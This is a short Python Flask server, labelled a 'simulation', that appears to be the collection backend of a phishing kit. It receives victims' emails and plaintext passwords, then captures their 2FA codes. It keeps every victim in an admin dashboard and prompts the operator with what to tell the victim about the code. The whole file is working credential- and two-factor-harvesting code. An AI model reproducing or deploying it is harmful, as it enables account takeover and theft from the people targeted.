from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Store captured data in memory for this simulation
captured_data = []
two_factor_codes = []
current_method = None # Reset to None to force selection

@app.route('/set_method', methods=['POST'])
def set_method():
    global current_method
    data = request.json
    current_method = data.get('method')
    return jsonify({"status": "success", "current_method": current_method})

@app.route('/phishing', methods=['POST'])
def capture_data():
    data = request.json
    captured_data.append(data)
    
    # Reset method to None when a new victim arrives to force admin selection
    global current_method
    current_method = None
    
    # Génération d'un code 2FA fictif pour la simulation
    import random
    fake_code = str(random.randint(100000, 999999))
    
    print(f"\n🔍 [PHISHING CAPTURED] 🔍\n")
    print(f"   Email: {data.get('email')}")
    print(f"   Password: {data.get('password')}") # Mot de passe en clair
    print(f"   Timestamp: {data.get('timestamp')}\n")
    print(f"   🔑 CODE 2FA GÉNÉRÉ : {fake_code}")
    print(f"   🚨 [ACTION] : Dites à la victime que son code est {fake_code}")
    print("   --------------------------------------------------\n")
    
    return jsonify({"status": "success", "simulated_code": fake_code, "method": current_method})

@app.route('/twofactor', methods=['POST'])
def capture_2fa():
    data = request.json
    code = data.get('code')
    two_factor_codes.append(code)
    print(f"\n🔑 [2FA CODE CAPTURED] 🔑\n")
    print(f"   Code: {code}")
    print(f"   Timestamp: {data.get('timestamp')}\n")
    print("   ✅ [SUCCESS] : Accès complet simulé !")
    return jsonify({"status": "success"})

@app.route('/phishing', methods=['GET'])
def get_captured_data():
    if not captured_data:
        return jsonify({"error": "No data captured yet"}), 404
    return jsonify(captured_data[-1])

@app.route('/twofactor', methods=['GET'])
def get_last_2fa():
    if not two_factor_codes:
        return jsonify({"error": "No 2FA code captured yet"}), 404
    return jsonify({"code": two_factor_codes[-1]})

@app.route('/admin', methods=['GET'])
def admin_dashboard():
    return jsonify({
        "last_victim": captured_data[-1] if captured_data else None,
        "current_method": current_method,
        "all_victims": captured_data,
        "last_2fa_code": two_factor_codes[-1] if two_factor_codes else None
    })

@app.route('/get_method', methods=['GET'])
def get_method():
    return jsonify({"method": current_method})

@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({"status": "alive"}), 200

if __name__ == '__main__':
    app.run(port=5000, debug=True)